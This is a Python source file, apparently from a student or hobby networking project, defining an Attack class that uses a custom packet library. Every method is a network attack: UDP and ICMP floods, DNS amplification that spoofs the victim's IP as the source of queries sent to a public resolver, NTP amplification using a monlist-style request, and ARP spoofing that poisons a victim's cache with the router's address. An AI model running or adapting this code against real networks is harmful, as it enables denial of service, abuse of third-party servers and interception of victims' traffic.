from protocols.udp import UDP
from protocols.icmp import ICMP
from protocols.ipv4 import IPv4
from protocols.dns import DNS
from protocols.ntp import NTP
from protocols.ethernet import Ethernet
from protocols.arp import ARP
from network import Network
import random


class Attack:
    def __init__(self, name):
        pass

    @staticmethod
    def udp_flood():
        dst_ip = input("Enter IP address to flood: ")
        # Build a fresh packet each iteration. Reusing one object across
        # send_and_received() calls would have its fields silently
        # overwritten by deserializer() on every response -- and floods
        # shouldn't wait for/parse responses at all, so use send_only.
        for i in range(10):
            pkt = IPv4(dst_ip=dst_ip).add_protocol(
                UDP(dst_port=random.randint(1, 65535))
            )
            Network.send_only(pkt)

    @staticmethod
    def icmp_flood():
        dst_ip = input("Enter IP address to flood: ")
        for i in range(10):
            pkt = IPv4(dst_ip=dst_ip).add_protocol(ICMP())
            Network.send_only(pkt)

    @staticmethod
    def dns_amplification():
        dst_ip = input("Enter IP address to amplification: ")
        # src_ip is spoofed to the victim so the (large) DNS response goes
        # to them, not to us -- so we never want to wait for or deserialize
        # a reply into this packet (and definitely shouldn't reuse the
        # same object: deserializer() would overwrite the spoofed src_ip).
        for i in range(10):
            pkt = IPv4(src_ip=dst_ip, dst_ip="8.8.8.8").add_protocol(
                UDP(dst_port=53).add_protocol(DNS("youtube.com"))
            )
            Network.send_only(pkt)

    @staticmethod
    def ntp_amplification():
        dst_ip = input("Enter IP address to amplification: ")
        for i in range(10):
            pkt = IPv4(src_ip=dst_ip, dst_ip="192.168.1.149").add_protocol(
                UDP(dst_port=123).add_protocol(
                    NTP(mode=6, opcode=1, sequence=10, association_id=0, data=b"system")
                )
            )
            Network.send_only(pkt)

    @staticmethod
    def arp_spoofing():
        dst_ip = input("Enter IP address to spoof: ")
        router_ip = input("Enter router IP address: ")

        # Step 1: discover the victim's real MAC via a genuine ARP
        # request/reply exchange -- this is the one part of this attack
        # that legitimately needs a real response.
        request = Ethernet(type=0x0806).add_protocol(ARP(target_ip=dst_ip))
        answer = Network.send_and_received(request)

        # _send_ethernet_raw only filters out our own outgoing frame, so
        # confirm what came back is actually an ARP reply about the IP
        # we asked for before trusting it -- otherwise unrelated traffic
        # on the wire (or a non-ARP frame, leaving payload as None) could
        # crash this or silently learn the wrong MAC.
        if answer.payload is None or not hasattr(answer.payload, "packet"):
            print(f"No ARP reply received for {dst_ip}.")
            return

        reply = answer.payload.packet
        if reply.get("operation") != 2 or reply.get("sender_ip") != dst_ip:
            print(f"Got a response, but it wasn't a matching ARP reply for {dst_ip}.")
            return

        target_mac = reply["sender_mac"]

        # Step 2: repeatedly send spoofed "router_ip is at our MAC" replies
        # directly to the victim. These are unsolicited and no reply is
        # expected, so send_only -- both to avoid the multi-second wait per
        # iteration, and because deserializing unrelated traffic back into
        # this object would corrupt the spoofed fields on later iterations.
        for i in range(10):
            spoof = Ethernet(type=0x0806, dst_mac_addr=target_mac).add_protocol(
                ARP(
                    sender_ip=router_ip,
                    target_ip=dst_ip,
                    target_mac=target_mac,
                    operation=2,
                )
            )
            Network.send_only(spoof)
